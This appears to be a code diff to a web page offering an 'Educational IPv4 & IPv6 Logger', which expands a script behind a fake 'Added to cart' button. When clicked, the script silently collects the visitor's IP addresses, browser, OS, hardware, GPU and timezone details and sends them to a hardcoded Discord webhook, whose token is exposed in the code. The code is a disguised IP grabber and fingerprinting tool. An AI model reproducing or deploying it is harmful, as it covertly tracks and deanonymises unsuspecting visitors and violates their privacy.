@@ -65,39 +65,78 @@
 
 <div class="card">
     <h2>Test Item</h2>
-    <p>Educational IPv4 & IPv6 Logger</p>
-    <button onclick="sendIP()">Send IPv4 & IPv6</button>
+    <p>Educational IPv4 & IPv6 Logger + Full Browser Info</p>
+    <button onclick="sendFullInfo()">Send Full Info</button>
     <div class="notification" id="notify">Added to cart successfully</div>
 </div>
 
 <script>
-async function sendIP() {
+async function sendFullInfo() {
     const webhook = "https://discord.com/api/webhooks/1405178051607793797/lrLovFGo3LWPXBe3u874pQYct3xulb679aybaGQtdDYsnyrBeEZCXT5I2zs39z2-RqAR"; // Replace with your webhook
 
     try {
+        // IPv4
         const ipv4Res = await fetch('https://api.ipify.org?format=json');
         const ipv4 = (await ipv4Res.json()).ip;
 
+        // IPv6
         let ipv6 = "No IPv6 detected";
         try {
             const ipv6Res = await fetch('https://api64.ipify.org?format=json');
             ipv6 = (await ipv6Res.json()).ip;
         } catch {}
 
-        const browser = navigator.userAgent;
-        const os = navigator.platform;
+        // Time & location
         const timestamp = new Date().toLocaleString();
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+        // Browser & device info
+        const ua = navigator.userAgent;
+        const os = navigator.platform;
+        const language = navigator.language;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth;
+        const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
+        const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+        
+        // Graphics card info via WebGL
+        let gpuInfo = "Unknown";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch {}
+
+        // Build message
         const payload = {
-            content: `**Test IP Logger (Educational)**\nIPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nBrowser: \`${browser}\`\nOS: \`${os}\`\nTime: \`${timestamp}\``
+            content: `**Educational Browser Info Report**\n` +
+                     `**IPv4:** \`${ipv4}\`\n` +
+                     `**IPv6:** \`${ipv6}\`\n` +
+                     `**OS:** \`${os}\`\n` +
+                     `**Browser UA:** \`${ua}\`\n` +
+                     `**Language:** \`${language}\`\n` +
+                     `**Screen Resolution:** \`${screenRes}\`\n` +
+                     `**Color Depth:** \`${colorDepth}\`\n` +
+                     `**CPU Cores:** \`${hardwareConcurrency}\`\n` +
+                     `**RAM:** \`${deviceMemory}\`\n` +
+                     `**GPU:** \`${gpuInfo}\`\n` +
+                     `**Timezone:** \`${tz}\`\n` +
+                     `**Date/Time:** \`${timestamp}\``
         };
 
+        // Send to Discord
         await fetch(webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
 
+        // Show notification
         document.getElementById("notify").style.display = "block";
 
     } catch (err) {
